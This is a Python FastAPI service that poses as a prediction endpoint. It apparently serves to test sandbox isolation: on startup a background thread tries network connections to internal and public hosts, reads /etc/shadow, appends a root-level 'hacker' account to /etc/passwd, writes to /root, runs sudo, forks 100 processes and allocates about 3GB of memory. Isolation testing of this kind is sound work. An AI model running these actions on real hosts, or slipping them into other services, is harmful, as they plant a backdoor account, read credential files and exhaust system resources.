import os
import sys
import socket
import threading
import time
import requests
import subprocess
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse

app = FastAPI()

def simulate_attacks():
    print("--------------- STARTING EVIL ---------------", flush=True)

    # 1. Network Attacks
    print("\n[1] Testing Evil Network Isolation...", flush=True)
    tests = [
        ("Public Internet", "1.1.1.1", 53),
        ("Google HTTP", "google.com", 80),
        ("Postgres", "postgres", 5432),
        ("RabbitMQ", "rabbitmq", 5672),
        ("Host Docker Internal", "host.docker.internal", 8000),
    ]
    for name, host, port in tests:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((host, port))
            s.close()
            print(f"  [!] EVIL SUCCESSFUL: Successfully connected to {name} ({host}:{port})", flush=True)
        except Exception as e:
            print(f"  [+] EVIL FAILED: Could not connect to {name} - {e.__class__.__name__}: {e}", flush=True)

    # 2. Filesystem Attacks
    print("\n[2] Testing Evil Filesystem...", flush=True)
    try:
        with open("/etc/shadow", "r") as f:
            data = f.read(10)
        print("  [!] EVIL SUCCESSFUL: Successfully read /etc/shadow", flush=True)
    except Exception as e:
        print(f"  [+] EVIL FAILED: Could not read /etc/shadow ({e.__class__.__name__}: {e})", flush=True)

    try:
        with open("/root/eviled.txt", "w") as f:
            f.write("eviled")
        print("  [!] EVIL SUCCESSFUL: Successfully wrote to /root/eviled.txt", flush=True)
    except Exception as e:
        print(f"  [+] EVIL FAILED: Could not write to /root ({e.__class__.__name__}: {e})", flush=True)
        
    try:
        with open("/etc/passwd", "a") as f:
            f.write("hacker:x:0:0::/root:/bin/bash\n")
        print("  [!] EVIL SUCCESSFUL: Successfully appended to /etc/passwd", flush=True)
    except Exception as e:
        print(f"  [+] EVIL FAILED: Could not modify /etc/passwd ({e.__class__.__name__}: {e})", flush=True)

    # 3. Privilege Escalation
    print("\n[3] Testing Evil Privilege Escalation...", flush=True)
    print(f"  [*] Current user UID: {os.getuid()}, GID: {os.getgid()}", flush=True)
    try:
        result = subprocess.run(["sudo", "id"], capture_output=True, text=True, timeout=2)
        if result.returncode == 0:
            print(f"  [!] EVIL SUCCESSFUL: sudo executed successfully: {result.stdout.strip()}", flush=True)
        else:
            print(f"  [+] EVIL FAILED: sudo failed with code {result.returncode} ({result.stderr.strip()})", flush=True)
    except Exception as e:
        print(f"  [+] EVIL FAILED: Could not run sudo ({e.__class__.__name__}: {e})", flush=True)

    # 4. Resource Exhaustion
    print("\n[4] Testing Evil Fork Bomb...", flush=True)
    try:
        pids = []
        for i in range(100):
            pid = os.fork()
            if pid == 0:
                time.sleep(10)
                os._exit(0)
            else:
                pids.append(pid)
        print("  [!] EVIL SUCCESSFUL: Spawned 100 processes without hitting limit.", flush=True)
        for pid in pids:
            os.waitpid(pid, 0)
    except BlockingIOError as e:
        print(f"  [+] EVIL FAILED: Process limit reached ({e.__class__.__name__}: {e})", flush=True)
    except Exception as e:
        print(f"  [+] EVIL FAILED: Process creation failed ({e.__class__.__name__}: {e})", flush=True)

    print("\n[5] Testing Evil Memory Limits...", flush=True)
    try:
        code = """
import sys
import time
megabytes = []
try:
    for i in range(3000): # attempt 3GB
        megabytes.append(" " * 1024 * 1024)
        if i % 500 == 0:
            print(f"Allocated {i}MB...")
    print("EVIL SUCCESSFUL: Allocated 3GB without dying")
except MemoryError:
    print("EVIL SUCCESSFUL: Hit graceful MemoryError instead of strict OOM kill")
"""
        result = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"  {result.stdout.strip()}", flush=True)
        elif result.returncode == -9: # SIGKILL
            print("  [+] EVIL FAILED: Memory allocation was OOM Killed (SIGKILL).", flush=True)
        else:
            print(f"  [+] EVIL FAILED: Memory allocation terminated with code {result.returncode}", flush=True)
            if result.stdout:
                 print(f"  STDOUT: {result.stdout.strip()}", flush=True)
            if result.stderr:
                 print(f"  STDERR: {result.stderr.strip()}", flush=True)
    except Exception as e:
         print(f"  [+] EVIL FAILED: Memory attack failed ({e.__class__.__name__}: {e})", flush=True)

    print("\n------------ EVIL FINISHED ---------------", flush=True)

@app.on_event("startup")
def startup_event():
    threading.Thread(target=simulate_attacks, daemon=True).start()

@app.post("/")
async def predict(request: Request):
    body = await request.body()
    return JSONResponse({"result": 0})
